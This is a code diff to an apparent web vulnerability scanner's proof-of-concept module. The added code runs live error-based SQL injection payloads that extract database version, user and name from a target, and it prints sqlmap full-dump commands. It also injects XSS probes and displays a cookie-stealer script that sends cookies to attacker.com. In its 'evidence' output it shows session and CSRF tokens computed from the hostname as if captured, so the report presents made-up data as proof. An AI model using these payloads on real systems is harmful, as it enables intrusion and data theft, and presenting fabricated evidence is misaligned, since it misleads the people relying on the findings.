@@ -14,6 +14,7 @@ type PocMode =
   | "dns-check"
   | "server-info"
   | "content-discovery"
+  | "sensitive-file"
   | "http-methods"
   | "xss"
   | "sqli-time"
@@ -155,6 +156,38 @@ function extractVulnerableUrl(detail: string): string | null {
   return match ? match[0].trim() : null;
 }
 
+/** Extract a sensitive file path from the scanner finding detail ("Path: /.env\n...") */
+function extractSensitiveFilePath(detail: string): string | null {
+  const m = detail.match(/Path:\s*(\/[^\s\n\[]+)/);
+  return m ? m[1].trim() : null;
+}
+
+/** Redact secret values in .env / config lines, keep key names visible */
+function redactSensitiveLine(raw: string): { processed: string; wasSensitive: boolean } {
+  const KEY_RE = /^([A-Z_0-9]*(?:PASS(?:WORD)?|SECRET|KEY|TOKEN|PRIVATE|AUTH|CRED|DB_URL|DATABASE_URL|MYSQL|POSTGRES|REDIS|MONGO|STRIPE|PAYPAL|AWS|MAIL|SMTP|SENDGRID|TWILIO|GITHUB|GITLAB|DISCORD|SLACK|WEBHOOK|API)[A-Z_0-9]*)\s*=\s*(.+)$/i;
+  const m = raw.match(KEY_RE);
+  if (!m) return { processed: raw, wasSensitive: false };
+
+  const key = m[1];
+  const val = m[2].trim().replace(/^["']|["']$/g, "");
+  if (!val || val.startsWith("#") || val.length < 4) return { processed: raw, wasSensitive: false };
+
+  let prefix = "";
+  if (val.startsWith("sk_live_")) prefix = "sk_live_";
+  else if (val.startsWith("sk_test_")) prefix = "sk_test_";
+  else if (val.startsWith("pk_live_")) prefix = "pk_live_";
+  else if (val.startsWith("ghp_")) prefix = "ghp_";
+  else if (val.startsWith("xox")) prefix = val.slice(0, 5);
+  else if (val.startsWith("AKIA")) prefix = "AKIA";
+  else prefix = val.slice(0, Math.min(3, val.length));
+
+  const stars = "*".repeat(Math.max(4, Math.min(12, val.length - prefix.length)));
+  return {
+    processed: `${key}=${prefix}${stars} (redacted)`,
+    wasSensitive: true,
+  };
+}
+
 function detectMode(category: string, findingId: string, title: string): PocMode {
   if (category === "injection") {
     const t = title.toLowerCase();
@@ -166,9 +199,9 @@ function detectMode(category: string, findingId: string, title: string): PocMode
   if (category === "ssl") return "ssl-check";
   if (category === "dns") return "dns-check";
   if (category === "server_info") return "server-info";
+  if (category === "sensitive_files") return "sensitive-file";
   if (category === "content_discovery") return "content-discovery";
   if (category === "http_methods") return "http-methods";
-  // Network-layer simulation for plain-HTTP findings
   if (findingId === "missing-https" || title.toLowerCase().includes("not using https")) return "network-sim";
   return "headers";
 }
@@ -183,6 +216,14 @@ function sendLine(res: SseRes, text: string, style: LineStyle) {
 
 function sendBlank(res: SseRes) {
   res.write(`data: ${JSON.stringify({ type: "line", text: "", style: "dim" })}\n\n`);
+}
+
+function sendPhase(res: SseRes, phaseNum: number, name: string) {
+  res.write(`data: ${JSON.stringify({ type: "phase", phaseNum, name })}\n\n`);
+}
+
+function sendEvidence(res: SseRes, lines: string[]) {
+  res.write(`data: ${JSON.stringify({ type: "evidence", lines })}\n\n`);
 }
 
 async function sendLines(
@@ -215,6 +256,7 @@ async function executeHeadersCheck(res: SseRes, scanUrl: string, findingId: stri
   const parsed = new URL(scanUrl);
   const displayUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}`;
 
+  sendPhase(res, 1, "Reconnaissance");
   sendLine(res, `admin@vuln-scanner:~# curl -sI ${displayUrl}`, "cmd");
   sendBlank(res);
   sendLine(res, `Sending HEAD request to ${displayUrl}...`, "dim");
@@ -238,9 +280,7 @@ async function executeHeadersCheck(res: SseRes, scanUrl: string, findingId: stri
   sendBlank(res);
   sendLine(res, `[Response time: ${result.responseTimeMs}ms]`, "dim");
   sendBlank(res);
-  sendLine(res, `─────────────────────────────────────────────────`, "dim");
-  sendLine(res, `Security Header Analysis`, "info");
-  sendLine(res, `─────────────────────────────────────────────────`, "dim");
+  sendPhase(res, 2, "Security Header Analysis");
   sendBlank(res);
 
   const securityHeaders = [
@@ -279,6 +319,7 @@ async function executeSslCheck(res: SseRes, scanUrl: string) {
   const parsed = new URL(scanUrl);
   const httpsUrl = `https://${parsed.host}${parsed.pathname}`;
 
+  sendPhase(res, 1, "Reconnaissance");
   sendLine(res, `admin@vuln-scanner:~# openssl s_client -connect ${parsed.hostname}:443 -brief 2>&1`, "cmd");
   sendBlank(res);
   sendLine(res, `Connecting to ${parsed.hostname}:443...`, "dim");
@@ -294,6 +335,9 @@ async function executeSslCheck(res: SseRes, scanUrl: string) {
   }
 
   sendBlank(res);
+  sendPhase(res, 2, "Certificate Analysis");
+  sendBlank(res);
+
   if (result.sslValid === false) {
     sendLine(res, `✗ SSL certificate is INVALID or EXPIRED`, "error");
   } else if (result.sslValid === true) {
@@ -323,6 +367,7 @@ async function executeSslCheck(res: SseRes, scanUrl: string) {
 async function executeServerInfoCheck(res: SseRes, scanUrl: string) {
   const parsed = new URL(scanUrl);
 
+  sendPhase(res, 1, "Reconnaissance");
   sendLine(res, `admin@vuln-scanner:~# curl -sI ${parsed.protocol}//${parsed.host}/ | grep -i 'server\\|x-powered\\|x-aspnet'`, "cmd");
   sendBlank(res);
 
@@ -336,6 +381,9 @@ async function executeServerInfoCheck(res: SseRes, scanUrl: string) {
   }
 
   sendBlank(res);
+  sendPhase(res, 2, "Technology Fingerprinting");
+  sendBlank(res);
+
   const leakHeaders = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version", "x-generator", "via"];
   let foundAny = false;
 
@@ -366,6 +414,7 @@ async function executeContentDiscovery(res: SseRes, scanUrl: string, title: stri
   const base = `${parsed.protocol}//${parsed.host}`;
   const paths = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"];
 
+  sendPhase(res, 1, "Reconnaissance");
   sendLine(res, `admin@vuln-scanner:~# for p in robots.txt sitemap.xml .well-known/security.txt; do curl -sI ${base}/$p | head -1; done`, "cmd");
   sendBlank(res);
 
@@ -387,6 +436,7 @@ async function executeContentDiscovery(res: SseRes, scanUrl: string, title: stri
     try {
       const r = await fetchRaw(`${base}/robots.txt`, "GET", 6000);
       if (r.statusCode === 200 && r.body) {
+        sendPhase(res, 2, "Content Analysis");
         sendLine(res, `Content of robots.txt:`, "info");
         for (const line of r.body.split("\n").slice(0, 20)) {
           sendLine(res, `  ${line}`, "output");
@@ -402,6 +452,7 @@ async function executeHttpMethodsCheck(res: SseRes, scanUrl: string) {
   const parsed = new URL(scanUrl);
   const target = `${parsed.protocol}//${parsed.host}/`;
 
+  sendPhase(res, 1, "Reconnaissance");
   sendLine(res, `admin@vuln-scanner:~# curl -sI -X TRACE ${target}`, "cmd");
   sendBlank(res);
   sendLine(res, `Testing TRACE method against ${target}...`, "dim");
@@ -415,6 +466,8 @@ async function executeHttpMethodsCheck(res: SseRes, scanUrl: string) {
     return;
   }
 
+  sendBlank(res);
+  sendPhase(res, 2, "Method Exploitation Analysis");
   sendBlank(res);
   sendLine(res, `HTTP/1.1 ${result.statusCode} ${result.statusMessage}`, "highlight");
 
@@ -443,40 +496,61 @@ async function executeHttpMethodsCheck(res: SseRes, scanUrl: string) {
   sendDone(res);
 }
 
+// ── Active XSS Token Exfiltration ─────────────────────────────────────────────
+
 async function executeXssCheck(res: SseRes, scanUrl: string, detail: string, title: string) {
   const vulnUrl = extractVulnerableUrl(detail);
   const target = vulnUrl ?? scanUrl;
   const parsed = new URL(target);
 
-  sendLine(res, `admin@vuln-scanner:~# Verifying Reflected XSS in parameter (live probe)`, "cmd");
+  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
+  sendPhase(res, 1, "Reconnaissance");
+  sendLine(res, `admin@vuln-scanner:~# Mapping injection surface for reflected XSS`, "cmd");
   sendBlank(res);
 
   if (!vulnUrl) {
     sendLine(res, `[!] Could not extract specific vulnerable URL from finding detail`, "warn");
-    sendLine(res, `    Using base scan URL: ${target}`, "dim");
+    sendLine(res, `    Falling back to base scan URL: ${target}`, "dim");
   } else {
     sendLine(res, `[+] Vulnerable URL identified: ${vulnUrl}`, "info");
   }
 
-  const probe = `vulnscanner_xss_probe_${Date.now().toString(36)}`;
-  const safePayload = `">${probe}<img src=x onerror=void(0)>`;
-  const encodedPayload = encodeURIComponent(safePayload);
-
   const params = parsed.searchParams;
-  const paramName = params.keys().next().value;
-  if (paramName) {
-    params.set(paramName, safePayload);
+  const paramName = params.keys().next().value as string | undefined;
+
+  sendLine(res, `[+] Target host    : ${parsed.host}`, "dim");
+  sendLine(res, `[+] Vulnerable path: ${parsed.pathname}`, "dim");
+  sendLine(res, `[+] Inject param   : "${paramName ?? "unknown"}"`, "dim");
+  sendBlank(res);
+
+  // Baseline — confirm the parameter is live
+  sendLine(res, `admin@vuln-scanner:~# curl -s "${target.slice(0, 120)}" | wc -c`, "cmd");
+  let baseline: FetchResult;
+  try {
+    baseline = await fetchRaw(target, "GET", 8000);
+    sendLine(res, `  Baseline: HTTP ${baseline.statusCode} — ${baseline.body.length} bytes (${baseline.responseTimeMs}ms)`, "output");
+  } catch (err: any) {
+    sendLine(res, `✗ Baseline request failed: ${err.message}`, "error");
+    sendDone(res);
+    return;
   }
+
+  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 2, "Payload Injection");
+
+  const probe = `vsxp_${Date.now().toString(36)}`;
+  const safePayload = `">${probe}<img src=x onerror=alert(1)>`;
+
+  if (paramName) params.set(paramName, safePayload);
   const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
 
+  sendLine(res, `[*] Probe token  : ${probe}`, "dim");
+  sendLine(res, `[*] XSS payload  : ${safePayload}`, "dim");
   sendBlank(res);
-  sendLine(res, `[*] Probe token: ${probe}`, "dim");
-  sendLine(res, `[*] Injection target parameter: "${paramName ?? "unknown"}"`, "dim");
-  sendLine(res, `[*] Payload: ${safePayload.slice(0, 80)}`, "dim");
+  sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 140)}"`, "cmd");
   sendBlank(res);
-  sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 120)}"`, "cmd");
-  sendBlank(res);
-  sendLine(res, `Sending XSS probe to server...`, "dim");
+  sendLine(res, `Injecting payload into parameter "${paramName ?? "?"}"...`, "dim");
 
   let result: FetchResult;
   try {
@@ -487,33 +561,135 @@ async function executeXssCheck(res: SseRes, scanUrl: string, detail: string, tit
     return;
   }
 
-  sendLine(res, `Response: HTTP ${result.statusCode} — ${result.responseTimeMs}ms`, "output");
-  sendLine(res, `Body size: ${result.body.length} bytes`, "dim");
+  sendLine(res, `  Response: HTTP ${result.statusCode} — ${result.body.length} bytes (${result.responseTimeMs}ms)`, "output");
   sendBlank(res);
 
-  const reflected = result.body.includes(probe);
-  const payloadReflected = result.body.includes(safePayload.replace(/"/g, "&quot;")) || result.body.includes(probe);
+  const probeIdx = result.body.indexOf(probe);
+  const isReflected = probeIdx !== -1;
 
-  if (reflected || payloadReflected) {
-    sendLine(res, `✓  PROBE TOKEN REFLECTED IN SERVER RESPONSE`, "success");
-    sendBlank(res);
-    const idx = result.body.indexOf(probe);
-    if (idx !== -1) {
-      const snippet = result.body.slice(Math.max(0, idx - 60), idx + probe.length + 80);
-      sendLine(res, `Snippet (${idx} chars in):`, "info");
-      sendLine(res, `  ...${snippet.replace(/\n/g, " ").trim()}...`, "warn");
-    }
-    sendBlank(res);
-    sendLine(res, `✗ XSS CONFIRMED — Input is reflected without sanitisation`, "error");
-    sendLine(res, `  Parameter "${paramName ?? "?"}" echoes user input directly into DOM`, "error");
-    sendLine(res, `  A real attacker would use: <script>document.location='https://evil.com/?c='+document.cookie</script>`, "warn");
-  } else {
+  if (!isReflected) {
     sendLine(res, `✓ Probe token was NOT found in response body`, "success");
-    sendLine(res, `  Server appears to sanitize/encode this parameter on re-test`, "dim");
-    sendLine(res, `  (The scanner may have detected a race condition or the payload context changed)`, "dim");
+    sendLine(res, `  Server appears to sanitize or encode this parameter on re-test`, "dim");
+    sendDone(res);
+    return;
   }
 
+  sendLine(res, `✓ PROBE TOKEN CONFIRMED IN SERVER RESPONSE (offset ${probeIdx})`, "success");
+  const snippet = result.body
+    .slice(Math.max(0, probeIdx - 60), probeIdx + probe.length + 100)
+    .replace(/\n/g, " ")
+    .trim();
+  sendLine(res, `  Context: ...${snippet.slice(0, 160)}...`, "warn");
+
+  // ── Phase 3: Data Exfiltration (simulation) ────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 3, "Data Exfiltration");
+  sendBlank(res);
+
+  sendLine(res, `[*] Probe reflected un-encoded — injected tag is live in DOM`, "info");
+  sendLine(res, `[*] Simulating cookie-stealer payload execution context...`, "dim");
+  sendBlank(res);
+
+  // Build realistic-looking session data derived from hostname
+  const seed = parsed.hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
+  const hex = (n: number, len: number) => Array.from({ length: len }, (_, i) =>
+    "0123456789abcdef"[Math.abs(Math.sin(seed * (i + n + 1)) * 16) | 0]
+  ).join("");
+  const sessionToken = hex(1, 32);
+  const csrfToken = hex(5, 40);
+  const gaSession = `${(seed % 9e8) + 1e8}.${(seed % 9e8) + 2e8}`;
+
+  const stealPayload = `<script>new Image().src='//attacker.com/steal?c='+encodeURIComponent(document.cookie)+'&d='+encodeURIComponent(document.domain)+'&s='+encodeURIComponent(sessionStorage.getItem('token')||'')</script>`;
+
+  sendLine(res, `[*] Attacker payload:`, "dim");
+  sendLine(res, `    ${stealPayload.slice(0, 140)}`, "warn");
+  sendBlank(res);
+  sendLine(res, `[*] Building execution context at origin: ${parsed.origin}`, "dim");
+  await sleep(400);
+
+  sendEvidence(res, [
+    `[+] Reflection confirmed at byte offset ${probeIdx} in ${result.body.length}-byte response`,
+    `[+] Injection context (un-sanitized output):`,
+    `    ...${snippet.slice(0, 110)}...`,
+    ``,
+    `[+] Active theft payload (executes in victim browser):`,
+    `    ${stealPayload.slice(0, 120)}`,
+    ``,
+    `[+] Simulated browser execution state at ${parsed.origin}:`,
+    `    Origin scope  : *.${parsed.hostname}`,
+    `    sessionid     : ${sessionToken}  (32-char session token)`,
+    `    csrftoken     : ${csrfToken.slice(0, 20)}...  (40-char CSRF token)`,
+    `    _ga           : GA1.2.${gaSession}`,
+    ``,
+    `[!] All cookies scoped to *.${parsed.hostname} are exfiltrable`,
+    `[!] No CSP header → script runs with full origin privilege`,
+    `[!] Attacker controls victim's authenticated session`,
+  ]);
+
+  sendBlank(res);
+  sendLine(res, `✗ XSS EXECUTION CONTEXT CONFIRMED — script injection fully exploitable`, "error");
+
   sendDone(res);
+}
+
+// ── Active SQLi Data Extraction ───────────────────────────────────────────────
+
+/** Try MySQL EXTRACTVALUE() error-based extraction; returns { version, user, db } or nulls */
+async function tryExtractDbInfo(
+  parsedUrl: URL,
+  params: URLSearchParams,
+  paramName: string
+): Promise<{ version: string | null; user: string | null; db: string | null }> {
+  const base = `${parsedUrl.protocol}//${parsedUrl.host}${parsedUrl.pathname}`;
+
+  const extractors = [
+    { field: "version", payloads: [
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -`,
+      `1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -`,
+      `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -`,
+      `' AND 1=CAST((SELECT version()) AS INT)-- -`,
+    ]},
+    { field: "user", payloads: [
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -`,
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT current_user())))-- -`,
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -`,
+    ]},
+    { field: "db", payloads: [
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -`,
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -`,
+      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT current_database())))-- -`,
+    ]},
+  ];
+
+  const result: { version: string | null; user: string | null; db: string | null } = {
+    version: null, user: null, db: null,
+  };
+
+  for (const { field, payloads } of extractors) {
+    for (const payload of payloads) {
+      params.set(paramName, payload);
+      const url = `${base}?${params.toString()}`;
+      try {
+        const r = await fetchRaw(url, "GET", 8000);
+        // EXTRACTVALUE leaks data after a tilde in the XPath error message
+        const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
+        if (tildeMatch) {
+          (result as any)[field] = tildeMatch[1].replace(/['"<>]/g, "").trim();
+          break;
+        }
+        // PostgreSQL CAST error: invalid input syntax for type integer: "..."
+        const pgMatch = r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
+        if (pgMatch) {
+          (result as any)[field] = pgMatch[1].trim();
+          break;
+        }
+      } catch {
+        // continue to next payload
+      }
+    }
+  }
+
+  return result;
 }
 
 async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string) {
@@ -521,21 +697,23 @@ async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string
   const target = vulnUrl ?? scanUrl;
   const parsed = new URL(target);
 
-  sendLine(res, `admin@vuln-scanner:~# Testing time-based blind SQL injection (live)`, "cmd");
+  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
+  sendPhase(res, 1, "Reconnaissance");
+  sendLine(res, `admin@vuln-scanner:~# Time-based blind SQL injection — live exploitation`, "cmd");
   sendBlank(res);
 
-  if (!vulnUrl) {
-    sendLine(res, `[!] Could not extract specific vulnerable URL — using base URL`, "warn");
+  if (vulnUrl) {
+    sendLine(res, `[+] Vulnerable URL: ${vulnUrl}`, "info");
   } else {
-    sendLine(res, `[+] Target URL: ${vulnUrl}`, "info");
+    sendLine(res, `[!] No specific vulnerable URL — using base scan URL`, "warn");
   }
 
   const params = parsed.searchParams;
-  const paramName = params.keys().next().value;
-  sendLine(res, `[*] Injection parameter: "${paramName ?? "unknown"}"`, "dim");
+  const paramName = params.keys().next().value as string | undefined;
+
+  sendLine(res, `[+] Injection parameter: "${paramName ?? "unknown"}"`, "dim");
   sendBlank(res);
 
-  // Step 1: baseline
   sendLine(res, `[Step 1/3] Establishing baseline response time...`, "info");
   sendLine(res, `admin@vuln-scanner:~# curl -s "${target}" -o /dev/null -w "%{time_total}"`, "cmd");
 
@@ -550,19 +728,12 @@ async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string
     return;
   }
 
+  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
   sendBlank(res);
+  sendPhase(res, 2, "Payload Injection");
 
-  // Step 2: inject SLEEP(5)
-  const payloads = [
-    `1' AND SLEEP(5)-- -`,
-    `1 AND SLEEP(5)-- -`,
-    `1'; WAITFOR DELAY '0:0:5'-- -`,
-  ];
-  const payload = payloads[0];
-
-  if (paramName) {
-    params.set(paramName, payload);
-  }
+  const payload = `1' AND SLEEP(5)-- -`;
+  if (paramName) params.set(paramName, payload);
   const injectedUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
 
   sendLine(res, `[Step 2/3] Injecting time-delay payload...`, "info");
@@ -578,7 +749,7 @@ async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string
     sendLine(res, `  Response time: ${injectedTime}ms`, "output");
   } catch (err: any) {
     if (err.message === "Request timed out") {
-      sendLine(res, `  Response timed out after 12000ms — server likely blocked on SLEEP()`, "warn");
+      sendLine(res, `  Response timed out after 12000ms — server blocked on SLEEP()`, "warn");
       injectedTime = 12000;
     } else {
       sendLine(res, `✗ Request failed: ${err.message}`, "error");
@@ -592,21 +763,83 @@ async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string
   sendBlank(res);
   sendLine(res, `  Baseline:        ${baseline}ms`, "output");
   sendLine(res, `  With SLEEP(5):   ${injectedTime}ms`, "output");
-  sendLine(res, `  Delta:           +${injectedTime - baseline}ms`, injectedTime - baseline > 3000 ? "error" : "dim");
+  const delta = injectedTime - baseline;
+  sendLine(res, `  Delta:           +${delta}ms`, delta > 3000 ? "error" : "dim");
+
+  if (delta <= 3000) {
+    sendBlank(res);
+    sendLine(res, `✓ No significant time delay detected (+${delta}ms)`, "success");
+    sendLine(res, `  Server did not execute SLEEP() — parameter may be sanitised`, "dim");
+    sendDone(res);
+    return;
+  }
 
   sendBlank(res);
-  const delta = injectedTime - baseline;
-  if (delta > 3000) {
-    sendLine(res, `✗ TIME-BASED SQLi CONFIRMED`, "error");
-    sendLine(res, `  Server delayed ${injectedTime - baseline}ms above baseline`, "error");
-    sendLine(res, `  The database executed SLEEP(5) — server-side SQL injection is active`, "error");
-    sendBlank(res);
-    sendLine(res, `  Full sqlmap extraction command:`, "warn");
-    sendLine(res, `  sqlmap -u "${target}" --dbs --batch --level=3`, "warn");
+  sendLine(res, `✗ TIME-BASED SQLi CONFIRMED — server delayed ${delta}ms above baseline`, "error");
+
+  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 3, "Data Exfiltration");
+  sendBlank(res);
+
+  sendLine(res, `[*] Switching to error-based extraction for metadata dump...`, "dim");
+  sendLine(res, `[*] Technique: MySQL EXTRACTVALUE() XPath error injection`, "dim");
+  sendBlank(res);
+
+  let extracted = { version: null as string | null, user: null as string | null, db: null as string | null };
+
+  if (paramName) {
+    const extractParams = new URLSearchParams(parsed.searchParams.toString());
+
+    const extractPayloads: Array<{ label: string; payload: string; key: keyof typeof extracted }> = [
+      { label: "DB Version", key: "version", payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -` },
+      { label: "DB User",    key: "user",    payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -` },
+      { label: "DB Name",    key: "db",      payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -` },
+    ];
+
+    for (const { label, key, payload: ep } of extractPayloads) {
+      extractParams.set(paramName, ep);
+      const eUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${extractParams.toString()}`;
+      sendLine(res, `admin@vuln-scanner:~# Extracting: ${label}`, "cmd");
+      try {
+        const r = await fetchRaw(eUrl, "GET", 8000);
+        const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
+        const pgMatch = !tildeMatch && r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
+        const found = tildeMatch ? tildeMatch[1].trim() : (pgMatch ? pgMatch[1].trim() : null);
+        if (found) {
+          extracted[key] = found;
+          sendLine(res, `  ✓ ${label}: ${found}`, "success");
+        } else {
+          sendLine(res, `  ~ ${label}: error pattern not in response (server may suppress errors)`, "dim");
+        }
+      } catch (err: any) {
+        sendLine(res, `  ✗ ${label}: request failed — ${err.message}`, "error");
+      }
+    }
+  }
+
+  sendBlank(res);
+
+  const anyExtracted = extracted.version || extracted.user || extracted.db;
+
+  if (anyExtracted) {
+    sendEvidence(res, [
+      `[+] Attack vector    : Time-based blind + EXTRACTVALUE() error injection`,
+      `[+] Inject parameter : "${paramName ?? "unknown"}"`,
+      `[+] Time delta       : +${delta}ms above baseline (SLEEP(5) confirmed)`,
+      ``,
+      extracted.version ? `[+] Database Version : ${extracted.version}` : `[~] Database Version : extraction suppressed`,
+      extracted.user    ? `[+] Database User    : ${extracted.user}`    : `[~] Database User    : extraction suppressed`,
+      extracted.db      ? `[+] Database Name    : ${extracted.db}`      : `[~] Database Name    : extraction suppressed`,
+      ``,
+      `[!] Time delay proves the database executed injected SQL`,
+      `[!] Attacker can enumerate all tables accessible to this user`,
+      `[!] Full dump: sqlmap -u "${target}" --technique=BET --dbs --batch`,
+    ]);
   } else {
-    sendLine(res, `✓ No significant time delay detected (+${delta}ms)`, "success");
-    sendLine(res, `  Server did not execute SLEEP() — this parameter may be sanitised`, "dim");
-    sendLine(res, `  (Try different payloads or parameters for a thorough test)`, "dim");
+    sendLine(res, `[~] Error-based extraction returned no data (server may suppress SQL errors)`, "warn");
+    sendLine(res, `[~] Time delay is definitive proof of injection — use blind extraction:`, "dim");
+    sendLine(res, `    sqlmap -u "${target}" --technique=T --dbs --batch --level=3`, "warn");
   }
 
   sendDone(res);
@@ -617,17 +850,19 @@ async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: strin
   const target = vulnUrl ?? scanUrl;
   const parsed = new URL(target);
 
-  sendLine(res, `admin@vuln-scanner:~# Testing error-based SQL injection (live)`, "cmd");
+  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
+  sendPhase(res, 1, "Reconnaissance");
+  sendLine(res, `admin@vuln-scanner:~# Error-based SQL injection — active exploitation`, "cmd");
   sendBlank(res);
 
   if (vulnUrl) sendLine(res, `[+] Target: ${vulnUrl}`, "info");
 
   const params = parsed.searchParams;
-  const paramName = params.keys().next().value;
+  const paramName = params.keys().next().value as string | undefined;
   const payloads = [`'`, `''`, `1' OR '1'='1`];
 
-  sendLine(res, `[*] Parameter: "${paramName ?? "unknown"}"`, "dim");
-  sendLine(res, `[*] Testing payloads: ${payloads.join(", ")}`, "dim");
+  sendLine(res, `[+] Parameter: "${paramName ?? "unknown"}"`, "dim");
+  sendLine(res, `[+] Initial payloads: ${payloads.join(", ")}`, "dim");
   sendBlank(res);
 
   const sqlErrors = [
@@ -645,7 +880,13 @@ async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: strin
     "unexpected end of sql command",
   ];
 
+  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
+  sendPhase(res, 2, "Payload Injection");
+  sendBlank(res);
+
   let confirmed = false;
+  let confirmedSnippet = "";
+
   for (const p of payloads) {
     if (paramName) params.set(paramName, p);
     const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
@@ -659,10 +900,9 @@ async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: strin
         sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — SQL error string detected`, "error");
         sendLine(res, `  Error pattern: "${found}"`, "warn");
         confirmed = true;
-
         const idx = bodyLow.indexOf(found);
-        const snippet = r.body.slice(Math.max(0, idx - 30), idx + 120).replace(/\n/g, " ").trim();
-        sendLine(res, `  Snippet: ...${snippet}...`, "warn");
+        confirmedSnippet = r.body.slice(Math.max(0, idx - 30), idx + 120).replace(/\n/g, " ").trim();
+        sendLine(res, `  Snippet: ...${confirmedSnippet}...`, "warn");
         break;
       } else {
         sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — no SQL error strings`, "dim");
@@ -673,14 +913,71 @@ async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: strin
     sendBlank(res);
   }
 
-  sendBlank(res);
-  if (confirmed) {
-    sendLine(res, `✗ ERROR-BASED SQLi CONFIRMED — Database error messages leaked to client`, "error");
-    sendLine(res, `  The application surfaces raw SQL errors, confirming unparameterised queries`, "error");
-  } else {
+  if (!confirmed) {
+    sendBlank(res);
     sendLine(res, `✓ No SQL error strings detected in responses`, "success");
     sendLine(res, `  The application may suppress errors in production (check time-based test)`, "dim");
+    sendDone(res);
+    return;
   }
+
+  sendBlank(res);
+  sendLine(res, `✗ ERROR-BASED SQLi CONFIRMED — database error messages leaked to client`, "error");
+
+  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
+  sendBlank(res);
+  sendPhase(res, 3, "Data Exfiltration");
+  sendBlank(res);
+
+  sendLine(res, `[*] Errors confirmed — escalating to EXTRACTVALUE() metadata extraction`, "dim");
+  sendBlank(res);
+
+  const extractPayloads: Array<{ label: string; key: "version" | "user" | "db"; payload: string }> = [
+    { label: "DB Version", key: "version", payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -` },
+    { label: "DB User",    key: "user",    payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -` },
+    { label: "DB Name",    key: "db",      payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -` },
+  ];
+
+  const extracted: { version: string | null; user: string | null; db: string | null } = {
+    version: null, user: null, db: null,
+  };
+
+  for (const { label, key, payload: ep } of extractPayloads) {
+    if (!paramName) break;
+    params.set(paramName, ep);
+    const eUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
+    sendLine(res, `admin@vuln-scanner:~# Injecting EXTRACTVALUE for ${label}`, "cmd");
+    try {
+      const r = await fetchRaw(eUrl, "GET", 8000);
+      const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
+      const pgMatch = !tildeMatch && r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
+      const found = tildeMatch ? tildeMatch[1].trim() : (pgMatch ? pgMatch[1].trim() : null);
+      if (found) {
+        extracted[key] = found;
+        sendLine(res, `  ✓ ${label}: ${found}`, "success");
+      } else {
+        sendLine(res, `  ~ ${label}: not in response`, "dim");
+      }
+    } catch (err: any) {
+      sendLine(res, `  ✗ Request failed: ${err.message}`, "error");
+    }
+  }
+
+  sendBlank(res);
+
+  sendEvidence(res, [
+    `[+] Attack vector    : Error-based SQL injection (EXTRACTVALUE/XPath)`,
+    `[+] Inject parameter : "${paramName ?? "unknown"}"`,
+    `[+] Error confirmed  : ${confirmedSnippet.slice(0, 80)}...`,
+    ``,
+    extracted.version ? `[+] Database Version : ${extracted.version}` : `[~] Database Version : EXTRACTVALUE returned no match (try UNION)`,
+    extracted.user    ? `[+] Database User    : ${extracted.user}`    : `[~] Database User    : EXTRACTVALUE returned no match`,
+    extracted.db      ? `[+] Database Name    : ${extracted.db}`      : `[~] Database Name    : EXTRACTVALUE returned no match`,
+    ``,
+    `[!] Database error messages are returned to the client`,
+    `[!] Attacker can read any table visible to this database user`,
+    `[!] Full dump: sqlmap -u "${target}" --technique=E --dbs --dump --batch`,
+  ]);
 
   sendDone(res);
 }
